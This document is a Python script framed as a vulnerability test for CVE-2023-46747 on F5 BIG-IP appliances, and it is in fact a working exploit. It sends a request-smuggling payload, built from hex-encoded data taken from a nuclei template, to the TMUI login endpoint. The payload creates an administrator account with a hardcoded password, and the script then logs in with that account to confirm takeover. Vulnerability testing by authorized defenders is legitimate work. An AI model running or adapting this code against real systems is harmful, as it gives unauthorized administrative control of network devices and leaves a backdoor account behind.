#!/usr/bin/python3
###
### Python script to test if a F5 BIG-IP is vulnerable for CVE-2023-46747.
### When vulnerable a user account with administrator rights is added.
###
### To mitigate this vulnerability, see: https://my.f5.com/manage/s/article/K000137353
###
### Name    : test_cve-2023-46747.py
### Author  : Niels van Sluis
### Version : 0.1
### Date    : 2023-11-02

import requests, socket, ssl, sys
from requests.auth import HTTPBasicAuth
requests.packages.urllib3.disable_warnings()

###
### get HOST from arguments
###
if len(sys.argv) == 2:
    HOST = sys.argv[1]
else:
    print("Usage: {} <ip-address>".format(sys.argv[0]))
    exit()


context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
context.verify_mode = ssl.CERT_NONE
context.check_hostname = False

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s_sock = context.wrap_socket(s, server_hostname=HOST)
s_sock.settimeout(3)
print("Connecting to {}:443.".format(HOST))
s_sock.connect((HOST, 443))
print("Connected to {}:443.".format(HOST))
s_sock.settimeout(60)

###
###  Account to create
###
username = "User1"
password = "0penSesame!!"

###
### Input below taken from nuclei template
### https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2023/CVE-2023-46747.yaml
###
hex_string = "0008485454502f312e310000122f746d75692f436f6e74726f6c2f666f726d0000093132372e302e302e310000096c6f63616c686f73740000096c6f63616c686f7374000050000003000b546d75692d44756262756600000b424242424242424242424200000a52454d4f5445524f4c450000013000a00b00096c6f63616c686f73740003000561646d696e000501715f74696d656e6f773d61265f74696d656e6f775f6265666f72653d2668616e646c65723d253266746d756925326673797374656d25326675736572253266637265617465262626666f726d5f706167653d253266746d756925326673797374656d253266757365722532666372656174652e6a737025336626666f726d5f706167655f6265666f72653d26686964654f626a4c6973743d265f62756676616c75653d65494c3452556e537758596f5055494f47634f4678326f30305863253364265f62756676616c75655f6265666f72653d2673797374656d757365722d68696464656e3d5b5b2241646d696e6973747261746f72222c225b416c6c5d225d5d2673797374656d757365722d68696464656e5f6265666f72653d266e616d653d"
hex_string = hex_string + username.encode("windows-1252").hex()
hex_string = hex_string + "266e616d655f6265666f72653d267061737377643d"
hex_string = hex_string + password.encode("windows-1252").hex()
hex_string = hex_string + "267061737377645f6265666f72653d2666696e69736865643d782666696e69736865645f6265666f72653d00ff00"

r = "POST /tmui/login.jsp HTTP/1.1\r\n"
r = r + "Host: " + HOST + "\r\n"
r = r + "Transfer-Encoding: chunked, chunked\r\n"
r = r + "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
r = r + "204\r\n"
r = r + bytes.fromhex(hex_string).decode("windows-1252")
r = r + "\r\n0\r\n\r\n"

###
### send raw http request
###
print("Send HTTP-request trying to add an account.")
s_sock.send(r.encode('windows-1252'))

while True:
    data = s_sock.recv(2048)
    if ( len(data) < 1 ) :
        break

s_sock.close()

###
### Check if added account works
###
print("Try to login with new account.")
res = requests.get('https://' + HOST + '/mgmt/tm/ltm', auth=HTTPBasicAuth(username, password), verify=False)
if res.status_code == 200:
    print("Login successful.")
    print("Server {} is vulnerable to CVE-2023-46747.".format(HOST))
else:
    print("Login to {} failed.".format(HOST))
    print("System doesn't seem to be vulnerable to CVE-2023-46747.")
